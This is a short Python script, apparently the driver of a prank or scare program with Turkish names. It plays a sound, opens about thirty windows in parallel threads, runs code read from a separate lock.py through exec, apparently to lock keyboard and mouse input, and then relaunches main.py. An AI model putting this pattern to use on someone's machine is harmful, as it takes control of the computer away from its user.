import first
from threading import Thread
import os
from playsound import playsound
import keyboard
import mouse


def Yazilar():
    playsound('music.wav', block=False)
    first.kafatasiSekmesi()
    for i in range(0, 29):
        Thread(target= first.aciklamaSekmesi).start()
    first.sonSekme()
    global calisiyor
    calisiyor = False
    os.system('python main.py')


def Lock():
    fromPy = open("lock.py", 'r')
    exec(fromPy.read())
    fromPy.close()

Thread(target=Lock).start()
Thread(target=Yazilar).start()
